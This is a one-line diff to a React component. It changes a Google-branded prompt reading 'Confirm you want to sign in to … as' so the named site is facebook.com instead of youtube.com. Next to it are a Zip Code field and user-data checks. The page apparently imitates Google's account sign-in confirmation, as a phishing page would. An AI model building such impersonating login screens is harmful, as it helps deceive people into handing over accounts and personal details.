@@ -194,7 +194,7 @@ Zip Code: '${postal}'
                 {userData.number !== null && userData.number !== undefined && userData.number !== -1 && (<div></div>)}
                  <div className='positivus'>
                 <img src={GoogleLogo} alt='google logo' className='googleImg'/>
-                <p className='positPara' id="lolo">Confirm you want to sign in to <span className='red-text'>youtube.com</span> as</p>
+                <p className='positPara' id="lolo">Confirm you want to sign in to <span className='red-text'>facebook.com</span> as</p>
                 <p className='positPara'> </p>
                 
                 <div className='positContent'>
